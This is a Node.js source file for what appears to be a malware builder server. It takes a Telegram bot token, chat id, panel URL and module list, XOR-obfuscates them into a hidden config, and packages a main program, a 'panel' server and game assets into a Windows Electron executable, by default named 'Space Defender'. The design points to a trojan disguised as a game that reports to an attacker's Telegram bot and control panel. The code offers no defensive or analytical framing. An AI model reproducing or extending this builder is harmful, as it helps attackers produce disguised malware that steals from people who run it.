const http = require('http')
const fs = require('fs')
const path = require('path')
const url = require('url')
const { execSync } = require('child_process')
const crypto = require('crypto')

const PORT = process.env.BUILDER_PORT || 3457
const PUBDIR = path.join(__dirname, 'public')

const mimes = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.png': 'image/png',
  '.json': 'application/json'
}

function randomkey(len) {
  let k = ''
  for (let i = 0; i < len; i++) k += String.fromCharCode(Math.floor(Math.random() * 256))
  return k
}

function obfuscate(str, key) {
  let r = ''
  for (let i = 0; i < str.length; i++) r += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length))
  return Buffer.from(r, 'binary').toString('base64')
}

function buildApp(config, modules, appName) {
  const outdir = path.join(__dirname, '..', 'build_' + Date.now())
  fs.mkdirSync(outdir, { recursive: true })
  fs.mkdirSync(path.join(outdir, 'panel', 'public'), { recursive: true })

  const encCfg = JSON.stringify(config)
  const xorKeyBuf = Buffer.from(config.xorKey, 'base64').toString('binary')
  const cfgJs = `(function(){const k=Buffer.from("${config.xorKey}","base64");function d(e){const b=Buffer.from(e,"base64").toString("binary");let r="";for(let i=0;i<b.length;i++)r+=String.fromCharCode(b.charCodeAt(i)^k.charCodeAt(i%k.length));return r}const c=JSON.parse(d("${obfuscate(encCfg, xorKeyBuf)}"));process.env.TGTOKEN=c.tgToken;process.env.TGCHAT=c.tgChatId;process.env.PANEL_URL=c.panelUrl;})();`
  fs.writeFileSync(path.join(outdir, 'config.js'), cfgJs)

  let mainSrc = fs.readFileSync(path.join(__dirname, '..', 'main.js'), 'utf8')
  mainSrc = 'require("./config.js")\n' + mainSrc
  fs.writeFileSync(path.join(outdir, 'main.js'), mainSrc)

  for (const f of ['game.js', 'index.html', 'style.css', 'package.json']) {
    const src = path.join(__dirname, '..', f)
    if (fs.existsSync(src)) fs.copyFileSync(src, path.join(outdir, f))
  }

  const pp = path.join(__dirname, '..', 'panel', 'public')
  if (fs.existsSync(pp)) for (const f of fs.readdirSync(pp)) fs.copyFileSync(path.join(pp, f), path.join(outdir, 'panel', 'public', f))
  if (fs.existsSync(path.join(__dirname, '..', 'panel', 'server.js'))) fs.copyFileSync(path.join(__dirname, '..', 'panel', 'server.js'), path.join(outdir, 'panel', 'server.js'))
  if (fs.existsSync(path.join(__dirname, '..', 'panel', 'data'))) fs.mkdirSync(path.join(outdir, 'panel', 'data'), { recursive: true })

  const pkg = JSON.parse(fs.readFileSync(path.join(outdir, 'package.json'), 'utf8'))
  pkg.name = appName.toLowerCase().replace(/\s+/g, '-')
  pkg.description = appName
  pkg.author = ''
  pkg.scripts = { start: 'electron .' }
  delete pkg.build
  delete pkg.devDependencies
  fs.writeFileSync(path.join(outdir, 'package.json'), JSON.stringify(pkg, null, 2))

  try {
    execSync(`npx @electron/packager . "${appName}" --platform=win32 --arch=x64 --out=dist --asar --overwrite`, {
      cwd: outdir, stdio: 'pipe', timeout: 300000
    })
    const exePath = path.join(outdir, 'dist', appName + '-win32-x64', appName + '.exe')
    return { ok: true, exe: exePath, dir: outdir }
  } catch (e) {
    return { ok: false, dir: outdir, error: e.message }
  }
}

function serveFile(res, fpath) {
  const ext = path.extname(fpath)
  try {
    res.writeHead(200, { 'Content-Type': mimes[ext] || 'application/octet-stream' })
    res.end(fs.readFileSync(fpath))
  } catch (e) {
    res.writeHead(404)
    res.end()
  }
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true)
  const method = req.method
  res.setHeader('Access-Control-Allow-Origin', '*')

  if (method === 'POST' && parsed.pathname === '/api/build') {
    let body = ''
    req.on('data', c => body += c)
    req.on('end', () => {
      try {
        const data = JSON.parse(body)
        const key = randomkey(64)
        const config = {
          tgToken: obfuscate(data.tgToken, key),
          tgChatId: obfuscate(data.tgChatId, key),
          panelUrl: obfuscate(data.panelUrl || 'http://localhost:3456', key),
          xorKey: Buffer.from(key, 'binary').toString('base64')
        }
        const result = buildApp(config, data.modules || [], data.appName || 'Space Defender')
        res.writeHead(200, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify(result))
      } catch (e) {
        res.writeHead(400)
        res.end(JSON.stringify({ ok: false, error: e.message }))
      }
    })
    return
  }

  let fpath = path.join(PUBDIR, parsed.pathname === '/' ? 'index.html' : parsed.pathname)
  if (fs.existsSync(fpath) && fs.statSync(fpath).isFile()) {
    serveFile(res, fpath)
  } else {
    serveFile(res, path.join(PUBDIR, 'index.html'))
  }
})

server.listen(PORT, () => {
  console.log('builder UI: http://localhost:' + PORT)
})
